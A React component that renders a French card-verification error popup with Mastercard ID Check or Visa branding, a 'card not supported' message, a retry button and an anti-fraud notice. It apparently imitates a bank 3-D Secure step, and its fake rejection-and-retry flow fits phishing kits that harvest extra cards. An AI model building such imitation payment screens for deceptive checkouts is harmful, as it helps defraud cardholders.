import React from 'react';

const CardVerificationErrorPopup = ({ 
  isVisible, 
  cardLogo, 
  onChangeCard,
  isLoading,
  brandName = "Agenda Funnel" 
}) => {
  if (!isVisible) return null;

  return (
    <div className="verification-wrapper">
      <div className="verification-popup error">
        <article className="head">
          <img className="brand-logo" src="mercanett.png" alt={brandName} />
          <img
            className={`card-logo ${cardLogo === '/mastercard-id-check.png' ? 'mastercard' : 'visa'}`}
            src={cardLogo}
            alt="Paiement vérifié"
          />
        </article>
        <h2 className="icon">❌</h2>
        <h2>Carte non-prise en charge</h2> 
        <p className="desc">
          Échec durant la vérification d'identité mode de paiement non-accepté.
        </p>
        <button onClick={onChangeCard} disabled={isLoading}>
          Réessayer
        </button>
        <div className='notice'>
          <p>
            Dans le cadre de la lutte contre la fraude, nous avons mis en place un système 
            de vérification d'identité pour nos paiements en ligne. 
            Assurez-vous d'utiliser une carte bancaire valide à votre nom.
          </p>
        </div>
      </div>
    </div>
  );
};

export default CardVerificationErrorPopup;
